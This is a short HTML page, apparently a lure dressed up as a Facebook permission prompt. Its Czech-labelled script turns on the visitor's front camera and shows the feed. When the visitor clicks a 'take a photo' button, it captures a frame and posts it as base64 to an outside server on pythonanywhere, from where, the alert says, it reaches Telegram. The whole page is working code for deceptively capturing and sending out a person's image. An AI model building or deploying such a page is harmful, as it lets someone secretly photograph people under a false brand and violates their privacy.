<!DOCTYPE html>
<html>
<head>
  <title>facebook wants to allow </title>
</head>
<body>
  <video id="video" width="320" height="240" autoplay playsinline></video>
  <button id="snap">Pořiď fotku</button>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <script>
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    })
    .then(stream => {
      document.getElementById('video').srcObject = stream;
    })
    .catch(error => {
      alert("Kamera nebyla povolena nebo nastala chyba: " + error);
    });

    document.getElementById('snap').onclick = function() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataUrl = canvas.toDataURL('image/png');

      // ODESÍLÁNÍ NA TVŮJ SERVER NA PYTHONANYWHERE
      fetch('https://lixo.pythonanywhere.com/upload', {
        method: 'POST',
        body: JSON.stringify({ image: dataUrl }),
        headers: { 'Content-Type': 'application/json' }
      }).then(res => res.json()).then(data => {
        alert('Fotka byla odeslána a měla by přijít do Telegramu!');
      });
    }
  </script>
</body>
</html>
